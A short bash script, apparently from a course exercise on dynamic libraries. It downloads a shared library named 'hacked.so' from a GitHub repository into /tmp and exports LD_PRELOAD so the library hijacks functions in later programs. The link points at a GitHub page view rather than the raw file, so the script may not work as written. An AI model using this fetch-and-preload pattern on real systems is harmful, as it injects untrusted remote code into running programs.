#!/bin/bash
wget -P /tmp https://github.com/ogwaanto/alx-low_level_programming/blob/5503be93b5b4d22ca274cc6aef2b0153cdbb3dcd/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so